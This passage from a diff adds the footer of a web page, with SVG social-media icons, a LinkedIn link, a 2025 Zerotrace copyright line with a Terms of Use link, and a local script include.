+        <path fill="#00B8D9" d="M0 255.1V432C0 458.5 21.5 480 48 480H464C490.5 480 512 458.5 512 432V255.1L343.9 392.7C304.5 423 247.6 423 208.1 392.7L0 255.1Z"/>
+      </svg>
+    </a>
+    <a href="https://www.linkedin.com/in/zerotrace/" class="social linkedin" target="_blank" rel="noopener" aria-label="LinkedIn profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M4.98 3.5c0 1.38-1.13 2.5-2.5 2.5A2.5 2.5 0 0 1 0 3.5C0 2.12 1.12 1 2.49 1a2.5 2.5 0 0 1 2.49 2.5ZM.5 23.5h4V7.99h-4V23.5Zm7.5 0h4v-8.32c0-2.21 2.4-3.46 3.94-2.02.5.47.56 1.13.56 1.86v8.48h4v-9.56c0-5.06-5.5-4.86-6.5-2.38V8h-4c.06 1.05 0 15.5 0 15.5Z"/>
+      </svg>
+    </a>
+  </div>
+  <p>&copy; 2025 Zerotrace | Built by Zerotrace | <a href="../terms-of-use.html" style="color: #00B8D9; text-decoration: underline;">Terms of Use</a></p>
+</footer>
+<script src="../script.js"></script>
+</body>
+</html>
